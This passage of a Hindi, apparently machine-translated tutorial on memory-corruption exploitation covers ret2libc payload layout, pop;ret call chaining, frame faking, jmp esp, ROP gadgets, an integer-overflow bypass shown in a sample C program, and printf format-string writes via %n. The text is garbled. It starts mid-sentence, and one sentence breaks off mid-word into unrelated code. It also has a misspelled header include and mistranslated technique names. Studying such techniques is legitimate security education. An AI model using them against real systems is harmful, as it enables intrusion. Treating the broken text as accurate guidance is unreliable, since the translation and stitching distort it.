тАЬAтАЭ \* EBP рдХреА рджреВрд░реА + 4 (EBP: 4 "A" рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдпрд╣ рдмреЗрд╣рддрд░ рд╣реИ рдХрд┐ рдпрд╣ рд╡рд╛рд╕реНрддрд╡рд┐рдХ EBP рд╣реЛ рддрд╛рдХрд┐ рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рддреНрд░реБрдЯрд┐рдпреЛрдВ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗ) + **system** рдХрд╛ рдкрддрд╛ (EIP рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдЧрд╛) + **exit** рдХрд╛ рдкрддрд╛ (system(тАЬ/bin/shтАЭ) рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдкрд░ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╕реНрдЯреИрдХ рдХреЗ рдкрд╣рд▓реЗ 4 рдмрд╛рдЗрдЯ EIP рдХреЗ рдЕрдЧрд▓реЗ рдкрддреЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ) + тАЬ**/bin/sh**тАЭ рдХрд╛ рдкрддрд╛ (system рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдкреИрд░рд╛рдореАрдЯрд░ рд╣реЛрдЧрд╛)

рдЗрд╕ рддрд░рд╣, EIP рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдкрддреЗ рд╕реЗ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬрд┐рд╕реЗ тАЬ/bin/shтАЭ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рдФрд░ рдЗрд╕рдХреЗ рдмрд╛рдж рдЗрд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдкрд░ рдПрдХреНрдЬрд┐рдЯ() рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред

рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдХрд┐рд╕реА рдкрддреЗ рдХрд╛ рдХреЛрдИ рдмрд╛рдЗрдЯ рд╢реВрдиреНрдп рдпрд╛ рдЕрдВрддрд░рд┐рдХреНрд╖ (\x20) рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрд╣рд▓реЗ рдкрддреЛрдВ рдХреЛ рдбрд┐рд╕рдПрд╕реЗрдореНрдмрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд╡рд╣рд╛рдБ рдХрдИ NOPs рд╣реЛрдВ рдЬреЛ рд╣рдореЗрдВ рд╕реАрдзреЗ рдлрд╝рдВрдХреНрд╢рди рдХреА рдмрдЬрд╛рдп рдЙрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХреЛ рдмреБрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП > x/8i system-4)ред

рдпрд╣ рд╡рд┐рдзрд┐ рдХрд╛рд░рдЧрд░ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рддреЗ рд╕рдордп рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп **ret** рдСрдкрдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░, рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕рдордЭ рдЖрддрд╛ рд╣реИ рдХрд┐ рдкрд╣рд▓реЗ 4 рдмрд╛рдЗрдЯ рд╡рд╛рдкрд╕ рд▓реМрдЯрдиреЗ рдХрд╛ рдкрддрд╛ рд╣реЛрдЧрд╛ред

рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рддрдХрдиреАрдХ рд╣реИ **strncpy()** рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдЯреИрдХ рд╕реЗ рд╣реАрдк рдореЗрдВ рдПрдХ рдкреЗрд▓реЛрдб рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдФрд░ рдлрд┐рд░ **gets()** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред

рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рддрдХрдиреАрдХ **mprotect()** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рднреА рдореЗрдореЛрд░реА рдХреЗ рдХрд┐рд╕реА рднрд╛рдЧ рдХреЛ рд╡рд╛рдВрдЫрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ BDS, MacOS рдФрд░ OpenBSD рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рдерд╛ рдпрд╛ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рдирд╣реАрдВ (рдЬреЛ рд▓рд┐рдЦрдиреЗ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛)ред рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд╕рд╛рде, рд╕реНрдЯреИрдХ рдХреЛ рдкреБрдирдГ рдирд┐рд╖реНрдкрд╛рджрдирдпреЛрдЧреНрдп рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХрд╛ рд▓рдЧрд╛рддрд╛рд░ рдЬреЛрдбрд╝рдирд╛**

рдкрд┐рдЫрд▓реЗ рддрдХрдиреАрдХ рдкрд░ рдЖрдзрд╛рд░рд┐рдд, рдЗрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд░реВрдк рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ:\
рднрд░рд╛рдИ + \&рдлрд╝рдВрдХреНрд╢рди1 + \&рдкреЙрдк;рд░реЗрдЯ; + \&arg\_fun1 + \&рдлрд╝рдВрдХреНрд╢рди2 + \&рдкреЙрдк;рд░реЗрдЯ; + \&arg\_fun2 + тАж

рдЗрд╕ рддрд░рд╣, рдЬрд┐рди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдмреБрд▓рд╛рдирд╛ рд╣реИ, рдЙрдиреНрд╣реЗрдВ рдПрдХ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХрдИ рддрд░реНрдХреЛрдВ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ, рддреЛ рдЖрд╡рд╢реНрдпрдХ рддрд░реНрдХреЛрдВ рдХреЛ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП 4) рдФрд░ 4 рддрд░реНрдХреЛрдВ рдХреЛ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдСрдкрдХреЛрдб рдХреЗ рд╕рд╛рде рд╕реНрдерд╛рди рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: рдкреЙрдк, рдкреЙрдк, рдкреЙрдк, рдкреЙрдк, рд░реЗрдЯ тАФ> **objdump -d executable**

**рдлреНрд░реЗрдореНрд╕ рдХрд╛ рдирдХрд▓реА рдПрдирдХреНрд░рд┐рдкреНрд╢рди (EBP рдХрд╛ рдПрдирдХреНрд░рд┐рдкреНрд╢рди рдлреНрд░реЗрдореНрд╕ рдХрд╛ рдПрдирдХреНрд░рд┐рдкреНрд╢рди)**

рдпрд╣ рдЙрд╕ рд╢рдХреНрддрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ рдЬрд┐рд╕реЗ EBP рдХреЛ рдорд╛рдирд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ EBP рдФрд░ "рд▓реАрд╡;рд░реЗрдЯ;рд░реЗрдЯ" рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдИ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдПрдирдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╢реБрд░реВ рдореЗрдВ, рд╢реЗрд▓рдХреЛрдб рдХреЛ рдЕрдЧрд▓реЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг
```
**Ret2PopRet**
```
рдЕрдЧрд░ рд╣рдо рдкрд╣рд▓реЗ рддрд░реНрдХ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдирд╣реАрдВ рд░рдЦрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рджреВрд╕рд░реЗ рдпрд╛ рддреАрд╕рд░реЗ рдкрд░ рд╣реИ, рддреЛ рд╣рдо EIP рдХреЛ рдкреЙрдк-рд░реЗрдЯ рдпрд╛ рдкреЙрдк-рдкреЙрдк-рд░реЗрдЯ рдХреЗ рдПрдХ рдкрддреЗ рд╕реЗ рдЕрдзрд┐рдЧреНрд░рд╣рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ рд╣рдореЗрдВ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ.

**рдореБрд░рд╛рдЯ рдХреА рддрдХрдиреАрдХ**

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рд╕рднреА рдкреНрд░реЛрдЧреНрд░рд╛рдо 0xbfffffff рд╕реЗ рдЖрд░рдВрдн рд╣реЛрддреЗ рд╣реИрдВред

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рдПрдХ рдирдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕реНрдЯреИрдХ рдХреИрд╕реЗ рдирд┐рд░реНрдорд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХреЛ рджреЗрдЦрдХрд░ рд╣рдо рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╡рд┐рдХрд╕рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдПрдХ рдРрд╕реЗ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдкреНрд░рд╛рд░рдВрдн рд╣реЛ рдЬрд┐рд╕рдореЗрдВ рдХреЗрд╡рд▓ рдПрдХ рдЪрд░ рд╢реИрд▓рдХреЛрдб рд╣реЛред рдЗрд╕рдХрд╛ рдкрддрд╛ рддрдм рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

рдЗрд╕ рддрд░рд╣ рд╕реЗ рд╢реИрд▓рдХреЛрдб рдХреЗ рд╕рд╛рде рдЪрд░ рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рдкрддрд╛ рд▓рдЧрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИред

рдпрд╣ рдХрд╛рд░рдг рд╣реИ рдХрд┐ execle рдлрд╝рдВрдХреНрд╢рди рдПрдХ рдРрд╕рд╛ рд╡рд╛рддрд╛рд╡рд░рдг рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреЗрд╡рд▓ рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЪрд╛рд╣рд┐рдПред

**ESP рдкрд░ рдЬрдВрдк: рд╡рд┐рдВрдбреЛрдЬ рд╕реНрдЯрд╛рдЗрд▓**

ESP рд╣рдореЗрд╢рд╛ рд╕реНрдЯреИрдХ рдХреА рд╢реБрд░реБрдЖрдд рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ, рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ EIP рдХреЛ **jmp esp** рдпрд╛ **call esp** рдХреЗ рдПрдХ рдкрддреЗ рд╕реЗ рдмрджрд▓рдиреЗ рдХрд╛ рдХрд╛рдо рд╣реИред рдЗрд╕ рддрд░рд╣, EIP рдХреЗ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХреЗ рдмрд╛рдж рд╢реИрд▓рдХреЛрдб рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **ret** рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рдмрд╛рдж ESP рдЕрдЧрд▓реЗ рдкрддреЗ рдкрд░ рд╣реЛрдЧрд╛, рдЬрд╣рд╛рдВ рд╢реИрд▓рдХреЛрдб рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИред

рдЕрдЧрд░ рд╡рд┐рдВрдбреЛрдЬ рдпрд╛ рд▓рд┐рдирдХреНрд╕ рдореЗрдВ ASLR рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рд╣реИ рддреЛ **jmp esp** рдпрд╛ **call esp** рдХреЛ рдХрд┐рд╕реА рд╕рд╛рдЭрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред ASLR рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рд╡реНрдпрдХреНрддрд┐рдЧрдд рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рднреАрддрд░ рдЦреЛрдЬ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╢реИрд▓рдХреЛрдб рдХреЛ рд╕реНрдЯреИрдХ рдХреЗ рдмреАрдЪ рдореЗрдВ рдирд╣реАрдВ рдмрд▓реНрдХрд┐ EIP рдХреЗ рдХреЛрд░рдкреНрд╢рди рдХреЗ рдмрд╛рдж рд╕реНрдерд╛рдирд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛, рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдмреАрдЪ рдореЗрдВ рдЪрд▓ рд░рд╣реА push рдпрд╛ pop рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдЫреВрдиреЗ рдирд╣реАрдВ рджреЗрддреА рд╣реИ (рдЬреЛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕реНрдЯреИрдХ рдХреЗ рдмреАрдЪ рдореЗрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)ред

рдЗрд╕реА рддрд░рд╣, рдпрджрд┐ рд╣рдореЗрдВ рдкрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╢реИрд▓рдХреЛрдб рдХреЛ рдХрд╣рд╛рдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рд╣рдо **call eax** рдпрд╛ **jmp eax (ret2eax)** рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**ROP (Return Oriented Programming) рдпрд╛ рдЙрдзрд╛рд░рд┐рдд рдХреЛрдб рдЯреБрдХрдбрд╝реЗ**

рдмреБрд▓рд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдб рдЯреБрдХрдбрд╝реЗ рдХреЛ рдЧреИрдЬреЗрдЯ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ, **ret2libc** рддрдХрдиреАрдХ рдФрд░ **pop,ret** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдПрдХ рд╕рд╛рде рдЬреЛрдбрд╝рдиреЗ рдХреА рдХреНрд░рд┐рдпрд╛ рд╣реЛрддреА рд╣реИред

рдХреБрдЫ рдкреНрд░реЛрд╕реЗрд╕рд░ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ 32 рдмрд┐рдЯ рдХрд╛ рдПрдХ рд╕реЗрдЯ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, MIPS)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрдВрдЯреЗрд▓ рдореЗрдВ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рдЪрд░ рдЖрдХрд╛рд░ рдХреА рд╣реЛрддреА рд╣реИрдВ рдФрд░ рдХрдИ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рдПрдХ рд╣реА рд╕реЗрдЯ рдХреЗ рдмрд┐рдЯ рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХрддреА рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

**movl $0xe4ff, -0x(%ebp)** тАФ> 0xffe4 рдмрд╛рдЗрдЯ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рдЗрд╕реЗ рднреА рдЕрдиреБрд╡рд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ: **jmp \*%esp**

рдЗрд╕ рддрд░рд╣, рдХреБрдЫ рдРрд╕реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рдЪрд▓рд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдореВрд▓ рдХрд╛рд░реНрдпрдХреНрд░рдо рдореЗрдВ рдирд╣реАрдВ рд╣реИрдВред

**ROPgadget.py** рд╣рдореЗрдВ рдмрд╛рдЗрдирд░реА рдореЗрдВ рдорд╛рди рдЦреЛрдЬрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

рдпрд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо **рдкреЗрд▓реЛрдб** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреБрдХреНрдд рд╣реИред рдЖрдк рдЙрд╕ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдЬ
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рджреЛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рд╣реИред рдкрд╣рд▓рд╛ рдЕрдЧрд▓реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рд▓рдВрдмрд╛рдИ рд╣реИ рдФрд░ рджреВрд╕рд░рд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реИред

рдпрджрд┐ рд╣рдо рдкрд╣рд▓реЗ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдирдХрд╛рд░рд╛рддреНрдордХ рд╕рдВрдЦреНрдпрд╛ рдкрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рдирд┐рдХрд▓реЗрдЧрд╛ рдХрд┐ len < 256 рдФрд░ рд╣рдо рдЙрд╕ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдкрд╛рд░ рдХрд░реЗрдВрдЧреЗ, рдФрд░ рд╕рд╛рде рд╣реА strlen(buffer) рднреА l рд╕реЗ рдХрдо рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ l unsigned int рд╣реИ рдФрд░ рдмрд╣реБрдд рдмрдбрд╝рд╛ рд╣реЛрдЧрд╛ред

рдпрд╣ рдкреНрд░рдХрд╛рд░ рдХреЗ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреБрдЫ рд▓рд┐рдЦрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧрд▓рдд рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдП рдЧрдП рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдкрд╛рд░ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

**рдЕрд╡рд┐рдХрд▓реНрдкрд┐рдд рдЪрд░**

рдПрдХ рдЕрд╡рд┐рдХрд▓реНрдкрд┐рдд рдЪрд░ рдХрд┐рд╕реА рдЪрд░ рдХрд╛ рдореВрд▓реНрдп рдирд╣реАрдВ рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рджреЗрдЦрдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдкрд┐рдЫрд▓реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдПрдХ рдЪрд░ рдХрд╛ рдореВрд▓реНрдп рд▓реЗ рдФрд░ рдпрд╣ рд╣рдорд▓рд╛рд╡рд╛рджреА рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЛред

## **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕**

рд╕реА рдореЗрдВ **`printf`** рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдХреБрдЫ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкреНрд░рд┐рдВрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреА **рдкрд╣рд▓реА рдкреИрд░рд╛рдореАрдЯрд░** рдпрд╣ рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рд╕рд╛рдорд╛рдиреНрдп рдкрд╛рда рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдлреЙрд░реНрдореЗрдЯрд░реНрд╕** рд╣реИрдВред **рдЕрдиреБрд╕рд░рдг рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдкреИрд░рд╛рдореАрдЯрд░** рдХреА рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ **рдореВрд▓реНрдп** **рдлреЙрд░реНрдореЗрдЯрд░реНрд╕** рд╕реЗ **рд╕реНрдерд╛рдирд╛рдВрддрд░рдг** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдореВрд▓ рдкрд╛рда** рд╕реЗред

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдЙрджреНрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдХ **рд╣рдорд▓рд╛рд╡рд╛рджреА рдкрд╛рда рдХреЛ рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ** рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд╛рджреА рдПрдХ **рд╡рд┐рд╢реЗрд╖ рдЗрдирдкреБрдЯ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ** **printf рдлреЙрд░реНрдореЗрдЯ** рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХрд┐рд╕реА рднреА рдкрддреЗ рдореЗрдВ рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛ рдХреЛ рд▓рд┐рдЦрдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред рдЗрд╕ рддрд░рд╣ рд╕реЗ **рд╡рд┐рдЪрд╛рд░рд╢реАрд▓ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред

рдлреЙрд░реНрдореЗрдЯрд░реНрд╕:
```bash
%08x тАФ> 8 hex bytes
%d тАФ> Entire
%u тАФ> Unsigned
%s тАФ> String
%n тАФ> Number of written bytes
%hn тАФ> Occupies 2 bytes instead of 4
<n>$X тАФ> Direct access, Example: ("%3$d", var1, var2, var3) тАФ> Access to var3
```
